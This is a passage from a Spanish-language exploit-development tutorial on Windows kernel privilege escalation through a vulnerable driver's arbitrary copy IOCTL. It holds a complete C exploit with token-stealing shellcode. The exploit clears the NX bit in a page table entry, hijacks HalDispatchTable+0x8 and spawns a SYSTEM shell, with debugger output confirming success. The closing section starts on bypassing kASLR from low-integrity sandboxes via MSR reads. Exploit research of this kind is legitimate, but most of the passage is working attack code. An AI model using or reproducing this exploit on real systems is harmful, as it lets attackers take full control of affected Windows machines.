   +0x000 WsleAge             : 0y0000
   +0x000 WsleProtection      : 0y000
   +0x000 NoExecute           : 0y0</span>
</code></pre></div></div><br>

<p class="plain-text">Para cambiar ese bit primero necesitamos obtener la dirección de la <code class="language-plaintext highlighter-rouge">PTE</code> de esa dirección, nos serviría <code class="language-plaintext highlighter-rouge">MiGetPteAddress</code> pero no podemos llamarla directamente.</p>
<a href="/exploit-development/windows-kernel/arbitrary-write/image.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/arbitrary-write/image.png"></p></div></a>

<p class="plain-text">Ya que la función está dentro de <code class="language-plaintext highlighter-rouge">nt</code> y no podemos llamarla la implementaremos directamente en <code class="language-plaintext highlighter-rouge">C</code>, el problema es que necesitamos la <code class="language-plaintext highlighter-rouge">pteBase</code> y es dinámica.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">QWORD GetPteAddress</span><span class="p">(</span><span class="na">QWORD</span><span class="ra"> address</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> pteBase</span><span class="p">) {
    </span><span class="na">QWORD</span><span class="p"> pteAddress</span><span class="o"> =</span><span class="p"> address</span><span class="o"> >></span><span class="mi"> 9</span><span class="p">;
    pteAddress</span><span class="o"> &=</span><span class="mi"> 0x7ffffffff8</span><span class="p">;
    pteAddress</span><span class="o"> +=</span><span class="p"> pteBase;

    </span><span class="o">return</span><span class="p"> pteAddress;
}</span>
</code></pre></div></div><br>

<p class="plain-text">No podemos llamar a <code class="language-plaintext highlighter-rouge">MiGetPteAddress</code> pero si podemos obtener la <code class="language-plaintext highlighter-rouge">pteBase</code> que se encuentra en el offset <code class="language-plaintext highlighter-rouge">0x13</code> de la función, esto aprovechando el <code class="language-plaintext highlighter-rouge">ArbitraryRead</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">u nt!MiGetPteAddress L6
nt!MiGetPteAddress:
fffff807`5f698780 48c1e909             shr     rcx,9
fffff807`5f698784 48b8f8ffffff7f000000 mov     rax,7FFFFFFFF8h
fffff807`5f69878e 4823c8               and     rcx,rax
fffff807`5f698791 48b80000000000c4ffff mov     rax,0FFFFC40000000000h
fffff807`5f69879b 4803c1               add     rax,rcx
fffff807`5f69879e c3                   ret

</span><span class="ro">0: kd></span><span class="p"> dq nt!MiGetPteAddress + 0x13 L1
fffff807`5f698793  ffffc400`00000000</span>
</code></pre></div></div><br>

<p class="plain-text">Iniciamos leyendo la <code class="language-plaintext highlighter-rouge">pteBase</code> de la función <code class="language-plaintext highlighter-rouge">MiGetPteAddress</code>, luego usamos nuestra implementación en <code class="language-plaintext highlighter-rouge">C</code> para obtener la <code class="language-plaintext highlighter-rouge">PTE</code> de <code class="language-plaintext highlighter-rouge">KUSER_SHARED_DATA + 0x800</code>, luego leemos su valor y apagamos el bit <code class="language-plaintext highlighter-rouge">63</code> o <code class="language-plaintext highlighter-rouge">XD</code> para restaurarlo, pero al cambiar cosas dentro de la <code class="language-plaintext highlighter-rouge">PTE</code> es necesario hacer un <code class="language-plaintext highlighter-rouge">Sleep</code> y esperar que se invaliden las <code class="language-plaintext highlighter-rouge">TLB</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#define</span><span class="na"> OFFSET_MiGetPteAddress</span><span class="mi"> 0x298780
</span><span class="o">#define</span><span class="na"> KUSER_SHARED_DATA</span><span class="mi"> 0xfffff78000000000</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">GIO"</span><span class="p">, GENERIC_READ</span><span class="o"> |</span><span class="p"> GENERIC_WRITE,</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">QWORD</span><span class="p"> kernelBase</span><span class="o"> =</span><span class="p"> GetKernelBase();
    </span><span class="na">QWORD</span><span class="p"> kernelHalDispatchTable</span><span class="o"> =</span><span class="p"> GetHalDispatchTable(kernelBase);
    </span><span class="na">QWORD</span><span class="p"> backupHalPointer</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, kernelHalDispatchTable </span><span class="o">+ </span><span class="mi">0x8</span><span class="p">);

    </span><span class="na">QWORD</span><span class="p"> shellcode</span><span class="o"> =</span><span class="p"> KUSER_SHARED_DATA</span><span class="o"> +</span><span class="mi"> 0x800</span><span class="p">;

    </span><span class="na">QWORD</span><span class="p"> pteBase</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, kernelBase</span><span class="o"> +</span><span class="p"> OFFSET_MiGetPteAddress </span><span class="o">+ </span><span class="mi">0x13</span><span class="p">);
    </span><span class="na">QWORD</span><span class="p"> pteData</span><span class="o"> =</span><span class="p"> GetPteAddress(shellcode, pteBase);
    </span><span class="na">QWORD</span><span class="p"> pteValue</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, pteData);
    pteValue </span><span class="o">&= ~</span><span class="p">(</span><span class="mi">1</span><span class="no">ULL</span><span class="o"> <<</span><span class="mi"> 63</span><span class="p">);

    ArbitraryWrite(hDevice, (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">pteValue, pteData,</span><span class="mi"> 0x8</span><span class="p">);
    Sleep(</span><span class="mi">100</span><span class="p">);

    ArbitraryWrite(hDevice, (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">tokenStealing, shellcode,</span><span class="o"> sizeof</span><span class="p">(tokenStealing));
    ArbitraryWrite(hDevice, (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">shellcode, kernelHalDispatchTable</span><span class="o"> +</span><span class="mi"> 0x8</span><span class="p">,</span><span class="mi"> 0x8</span><span class="p">);

    </span><span class="na">DWORD</span><span class="p"> interval;
    NtQueryIntervalProfile(</span><span class="mi">0x10</span><span class="p">,</span><span class="o"> &</span><span class="p">interval);

    ArbitraryWrite(hDevice, (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">backupHalPointer, kernelHalDispatchTable</span><span class="o"> +</span><span class="mi"> 0x8</span><span class="p">, </span><span class="mi">0x8</span><span class="p">);
    CloseHandle(hDevice);

    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Ya con el exploit vamos a comprobarlo, antes de ejecutar el exploit la <code class="language-plaintext highlighter-rouge">PTE</code> de la dirección <code class="language-plaintext highlighter-rouge">KUSER_SHARED_DATA + 0x800</code> tiene habilitado el bit <code class="language-plaintext highlighter-rouge">63</code> o <code class="language-plaintext highlighter-rouge">XD</code>, y luego de ejecutarlo a través de la primitiva de escritura ahora nos dice que está apagado.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> !pte 0xfffff78000000000 + 0x800
                                           VA fffff78000000800
PXE at FFFFF178BC5E2F78    PPE at FFFFF178BC5EF000    PDE at FFFFF178BDE00000    PTE at FFFFF17BC0000000
contains 0000000005300063  contains 0000000005301063  contains 0000000005302063  contains 8000000005429963
pfn 5300      ---DA--KWEV  pfn 5301      ---DA--KWEV  pfn 5302      ---DA--KWEV  pfn 5429      -G-DA--KW-V

</span><span class="ro">0: kd></span><span class="p"> dt nt!_MMPTE_HARDWARE 0xfffff17bc0000000
   +0x000 Valid               : 0y1
   +0x000 Dirty1              : 0y1
   +0x000 Owner               : 0y0
   +0x000 WriteThrough        : 0y0
   +0x000 CacheDisable        : 0y0
   +0x000 Accessed            : 0y1
   +0x000 Dirty               : 0y1
   +0x000 LargePage           : 0y0
   +0x000 Global              : 0y1
   +0x000 CopyOnWrite         : 0y0
   +0x000 Unused              : 0y0
   +0x000 Write               : 0y1
   +0x000 PageFrameNumber     : 0y000000000000000000000101010000101001 (0x5429)
   +0x000 ReservedForHardware : 0y0000
   +0x000 ReservedForSoftware : 0y0000
   +0x000 WsleAge             : 0y0000
   +0x000 WsleProtection      : 0y000
   +0x000 NoExecute           : 0y1</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop></span><span class="am"> exploit.exe</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">dt nt!_MMPTE_HARDWARE 0xfffff17bc0000000
   +0x000 Valid               : 0y1
   +0x000 Dirty1              : 0y1
   +0x000 Owner               : 0y0
   +0x000 WriteThrough        : 0y0
   +0x000 CacheDisable        : 0y0
   +0x000 Accessed            : 0y1
   +0x000 Dirty               : 0y1
   +0x000 LargePage           : 0y0
   +0x000 Global              : 0y1
   +0x000 CopyOnWrite         : 0y0
   +0x000 Unused              : 0y0
   +0x000 Write               : 0y1
   +0x000 PageFrameNumber     : 0y000000000000000000000101010000101001 (0x5429)
   +0x000 ReservedForHardware : 0y0000
   +0x000 ReservedForSoftware : 0y0000
   +0x000 WsleAge             : 0y0000
   +0x000 WsleProtection      : 0y000
   +0x000 NoExecute           : 0y0</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora nuestro exploit inicia apagando el bit <code class="language-plaintext highlighter-rouge">XD</code> de <code class="language-plaintext highlighter-rouge">KUSER_SHARED_DATA + 0x800</code>, luego movemos nuestro shellcode ahí, después de eso cambiamos el puntero dentro de <code class="language-plaintext highlighter-rouge">KernelHalDispatchTable + 0x8</code> por la dirección de nuestro shellcode, finalmente solo llamamos a la función <code class="language-plaintext highlighter-rouge">NtQueryIntervalProfile</code> para ejecutar esa direccion.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include</span><span class="s"> &ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>
</span><span class="o">#include</span><span class="s"> &ltpsapi.h>

</span><span class="o">#define</span><span class="na"> QWORD ULONGLONG

</span><span class="o">#define</span><span class="na"> IOCTL_COPY</span><span class="mi"> 0xC3502808
</span><span class="o">#define</span><span class="na"> OFFSET_MiGetPteAddress</span><span class="mi"> 0x298780
</span><span class="o">#define</span><span class="na"> KUSER_SHARED_DATA</span><span class="mi"> 0xfffff78000000000

</span><span class="no">typedef struct</span><span class="p"> CopyData {
    </span><span class="na">QWORD</span><span class="p"> DstAddress;
    </span><span class="na">QWORD</span><span class="p"> SrcAddress;
    </span><span class="na">DWORD</span><span class="p"> Size;
} </span><span class="na">CopyData</span><span class="p">;

</span><span class="no">typedef </span><span class="p">NTSTATUS(</span><span class="na">WINAPI</span><span class="o"> *</span><span class="p">NtQueryIntervalProfile_t) (
    </span><span class="p">IN</span><span class="na"> ULONG</span><span class="p"> ProfileSource,
    </span><span class="p">OUT</span><span class="na"> PULONG</span><span class="p"> Interval
);

NtQueryIntervalProfile_t NtQueryIntervalProfile </span><span class="o">= </span><span class="p">(NtQueryIntervalProfile_t) GetProcAddress(GetModuleHandleA(</span><span class="s">"ntdll.dll"</span><span class="p">), </span><span class="s">"NtQueryIntervalProfile"</span><span class="p">);

</span><span class="na">BYTE</span><span class="p"> tokenStealing[</span><span class="mi">60</span><span class="p">]</span><span class="o"> =</span><span class="p"> {
    </span><span class="mi">0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x14</span><span class="p">,</span><span class="mi"> 0x25</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1"> // mov rdx, [gs:0x188]              ; $rdx = _KTHREAD
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x82</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rax, [rdx + 0xb8]            ; $rax = _EPROCESS
    </span><span class="mi">0x50</span><span class="p">,</span><span class="mi"> 0x5b</span><span class="p">,</span><span class="c1">                                           // mov rbx, rax                     ; $rbx = _EPROCESS
                                                          // .loop:
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     mov rbx, [rbx + 0x448]       ; $rbx = ActiveProcessLinks
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xeb</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     sub rbx, 0x448               ; $rbx = _EPROCESS
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="c1">       //     cmp qword [rbx + 0x440], 0x4 ; cmp PID to SYSTEM PID
    </span><span class="mi">0x75</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="c1">                                           //     jnz .loop                    ; if zf == 0 -> loop
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rcx, [rbx + 0x4b8]           ; $rcx = SYSTEM token
    </span><span class="mi">0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="c1">                                     // and cl, 0xf0                     ; clear _EX_FAST_REF struct
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov [rax + 0x4b8], rcx           ; store SYSTEM token in _EPROCESS
    </span><span class="mi">0xc3</span><span class="c1">                                                  // ret                              ; return
</span><span class="p">};

</span><span class="na">VOID ArbitraryWrite</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> what</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> where</span><span class="p">,</span><span class="na"> DWORD</span><span class="ra"> size</span><span class="p">) {
    CopyData userData;

    userData.DstAddress</span><span class="o"> =</span><span class="p"> where;
    userData.SrcAddress</span><span class="o"> =</span><span class="p"> what;
    userData.Size</span><span class="o"> =</span><span class="p"> size;

    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> CopyData), </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
}

</span><span class="na">QWORD ArbitraryRead</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> where</span><span class="p">) {
    </span><span class="na">QWORD</span><span class="p"> output;
    CopyData userData;

    userData.DstAddress </span><span class="o">=</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">output;
    userData.SrcAddress</span><span class="o"> =</span><span class="p"> where;
    userData.Size</span><span class="o"> =</span><span class="mi"> 8</span><span class="p">;

    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o"> &</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> CopyData), </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">return</span><span class="p"> output;
}

</span><span class="na">QWORD GetHalDispatchTable</span><span class="p">(</span><span class="na">QWORD</span><span class="ra"> kernelBase</span><span class="p">) {
    </span><span class="na">HMODULE</span><span class="p"> hKernel</span><span class="o"> =</span><span class="p"> LoadLibraryA(</span><span class="s">"C:</span><span class="mi">\\</span><span class="s">Windows</span><span class="mi">\\</span><span class="s">System32</span><span class="mi">\\</span><span class="s">ntoskrnl.exe"</span><span class="p">);

    </span><span class="na">QWORD</span><span class="p"> userHalDispatchTable</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) GetProcAddress(hKernel, </span><span class="s">"HalDispatchTable"</span><span class="p">);
    </span><span class="na">QWORD</span><span class="p"> offsetHalDispatchTable</span><span class="o"> =</span><span class="p"> userHalDispatchTable</span><span class="o"> -</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) hKernel;
    </span><span class="na">QWORD</span><span class="p"> kernelHalDispatchTable</span><span class="o"> =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="p"> offsetHalDispatchTable;

    FreeLibrary(hKernel);
    </span><span class="o">return</span><span class="p"> kernelHalDispatchTable;
}

</span><span class="na">QWORD GetPteAddress</span><span class="p">(</span><span class="na">QWORD</span><span class="ra"> address</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> pteBase</span><span class="p">) {
    </span><span class="na">QWORD</span><span class="p"> pteAddress</span><span class="o"> =</span><span class="p"> address</span><span class="o"> >></span><span class="mi"> 9</span><span class="p">;
    pteAddress</span><span class="o"> &=</span><span class="mi"> 0x7ffffffff8</span><span class="p">;
    pteAddress</span><span class="o"> +=</span><span class="p"> pteBase;

    </span><span class="o">return</span><span class="p"> pteAddress;
}

</span><span class="na">QWORD</span><span class="na"> GetKernelBase</span><span class="p">() {
    </span><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
    </span><span class="na">DWORD</span><span class="p"> cbNeeded;

    EnumDeviceDrivers(drivers, </span><span class="o">sizeof</span><span class="p">(drivers),</span><span class="o"> &</span><span class="p">cbNeeded);
    </span><span class="o">return</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) drivers[</span><span class="mi">0</span><span class="p">];
}

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">GIO"</span><span class="p">, GENERIC_READ</span><span class="o"> |</span><span class="p"> GENERIC_WRITE,</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">QWORD</span><span class="p"> kernelBase</span><span class="o"> =</span><span class="p"> GetKernelBase();
    </span><span class="na">QWORD</span><span class="p"> kernelHalDispatchTable</span><span class="o"> =</span><span class="p"> GetHalDispatchTable(kernelBase);
    </span><span class="na">QWORD</span><span class="p"> backupHalPointer</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, kernelHalDispatchTable </span><span class="o">+ </span><span class="mi">0x8</span><span class="p">);

    </span><span class="na">QWORD</span><span class="p"> shellcode</span><span class="o"> =</span><span class="p"> KUSER_SHARED_DATA</span><span class="o"> +</span><span class="mi"> 0x800</span><span class="p">;

    </span><span class="na">QWORD</span><span class="p"> pteBase</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, kernelBase</span><span class="o"> +</span><span class="p"> OFFSET_MiGetPteAddress </span><span class="o">+ </span><span class="mi">0x13</span><span class="p">);
    </span><span class="na">QWORD</span><span class="p"> pteData</span><span class="o"> =</span><span class="p"> GetPteAddress(shellcode, pteBase);
    </span><span class="na">QWORD</span><span class="p"> pteValue</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, pteData);
    pteValue </span><span class="o">&= ~</span><span class="p">(</span><span class="mi">1</span><span class="no">ULL</span><span class="o"> <<</span><span class="mi"> 63</span><span class="p">);

    ArbitraryWrite(hDevice, (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">pteValue, pteData,</span><span class="mi"> 0x8</span><span class="p">);
    Sleep(</span><span class="mi">100</span><span class="p">);

    ArbitraryWrite(hDevice, (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">tokenStealing, shellcode,</span><span class="o"> sizeof</span><span class="p">(tokenStealing));
    ArbitraryWrite(hDevice, (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">shellcode, kernelHalDispatchTable</span><span class="o"> +</span><span class="mi"> 0x8</span><span class="p">,</span><span class="mi"> 0x8</span><span class="p">);

    </span><span class="na">DWORD</span><span class="p"> interval;
    NtQueryIntervalProfile(</span><span class="mi">0x10</span><span class="p">,</span><span class="o"> &</span><span class="p">interval);

    ArbitraryWrite(hDevice, (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">backupHalPointer, kernelHalDispatchTable</span><span class="o"> +</span><span class="mi"> 0x8</span><span class="p">, </span><span class="mi">0x8</span><span class="p">);
    CloseHandle(hDevice);

    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Al correr el exploit ahora ejecutará un shellcode aprovechando el espacio en kernel <code class="language-plaintext highlighter-rouge">KUSER_SHARED_DATA</code> ya que no le afecta <code class="language-plaintext highlighter-rouge">kASLR</code>, así obtenemos <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop> </span><span class="am">whoami</span><span class="p">
windows\user

C:\Users\user\Desktop> </span><span class="am">exploit.exe</span><span class="p">
Microsoft Windows [Versión 10.0.19045.6456]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\user\Desktop> </span><span class="am">whoami</span><span class="p">
nt authority\system

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

</section>

<section class="post" id="integrity">
<br><h3 class="post-title">Low Integrity</h3><br>

<p class="plain-text">Hasta ahora todos nuestros exploits los hemos desarrollado para escalar privilegios desde un usuario normal que normalmente corre en <code class="language-plaintext highlighter-rouge">Medium Integrity Level</code> por lo que usando <code class="language-plaintext highlighter-rouge">EnumDeviceDrivers</code> podemos obtener la base del kernel y evitar <code class="language-plaintext highlighter-rouge">kASLR</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include </span><span class="s">&ltstdio.h>
</span><span class="o">#include </span><span class="s">&ltpsapi.h>

</span><span class="o">#define</span><span class="na"> QWORD ULONGLONG

QWORD GetKernelBase</span><span class="p">() {
    </span><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
    </span><span class="na">DWORD</span><span class="p"> cbNeeded;

    EnumDeviceDrivers(drivers, </span><span class="o">sizeof</span><span class="p">(drivers),</span><span class="o"> &</span><span class="p">cbNeeded);
    </span><span class="o">return</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) drivers[</span><span class="mi">0</span><span class="p">];
}

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">QWORD</span><span class="p"> kernelBase</span><span class="o"> =</span><span class="p"> GetKernelBase();
    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[*] Kernel Base: 0x</span><span class="mi">%llx\n</span><span class="s">"</span><span class="p">, kernelBase);

    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop> </span><span class="am">whoami</span><span class="p"> /groups |</span><span class="am"> findstr</span><span class="p"> Nivel
Etiqueta obligatoria\Nivel obligatorio medio                     Etiqueta       S-1-16-8192

C:\Users\user\Desktop></span><span class="am"> exploit.exe</span><span class="p">
[*] Kernel Base: 0xfffff80615400000

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

<p class="plain-text">Esto cambia cuando se ejecuta dentro de un <code class="language-plaintext highlighter-rouge">Sandbox</code>, por ejemplo cuando se corre en el contexto de un navegador este corre en <code class="language-plaintext highlighter-rouge">Low Integrity Level</code>, para imitar su comportamiento copiamos la <code class="language-plaintext highlighter-rouge">cmd.exe</code> y cambiamos su nivel de integridad a <code class="language-plaintext highlighter-rouge">Low</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop> </span><span class="am">copy</span><span class="p"> C:\Windows\System32\cmd.exe cmd.exe
        1 archivo(s) copiado(s).

C:\Users\user\Desktop> </span><span class="am">icacls</span><span class="p"> cmd.exe /setintegritylevel Low
archivo procesado: cmd.exe
Se procesaron correctamente 1 archivos; error al procesar 0 archivos

C:\Users\user\Desktop> </span><span class="am">cmd.exe</span><span class="p">
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el exploit en un nivel de integridad bajo, la función <code class="language-plaintext highlighter-rouge">EnumDeviceDrivers</code> fallará devolviendo como valor <code class="language-plaintext highlighter-rouge">0</code> y haciendo que falle el resto de nuestro exploit.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop> </span><span class="am">whoami</span><span class="p"> /groups |</span><span class="am"> findstr</span><span class="p"> Nivel
Etiqueta obligatoria\Nivel obligatorio bajo                      Etiqueta       S-1-16-4096

C:\Users\user\Desktop> </span><span class="am">exploit.exe</span><span class="p">
[*] Kernel Base: 0x0

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

<p class="plain-text">Basados en el <a href="#reversing">reversing</a> inicial tenemos un código <code class="language-plaintext highlighter-rouge">ioctl</code> que nos sirve para leer o escribir registros <code class="language-plaintext highlighter-rouge">MSR</code>, esto puede ser muy útil así que vamos a definir una función <code class="language-plaintext highlighter-rouge">ReadMSR</code> aprovechando esto, el segundo valor del arreglo nos devuelve el valor.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="na">QWORD ReadMSR</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> DWORD</span><span class="ra"> reg</span><span class="p">) {
    </span><span class="na">QWORD</span><span class="p"> output[</span><span class="mi">2</span><span class="p">];
    MSRData userData;

    userData.Type</span><span class="o"> =</span><span class="mi"> 1</span><span class="p">;
    userData.Register</span><span class="o"> =</span><span class="p"> reg;

    DeviceIoControl(hDevice, IOCTL_READMSR, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o"> &</span><span class="p">userData, </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> MSRData), (</span><span class="na">LPVOID</span><span class="p">) output, </span><span class="o">sizeof</span><span class="p">(output), </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">return</span><span class="p"> output[</span><span class="mi">1</span><span class="p">];
}</span>
</code></pre></div></div><br>

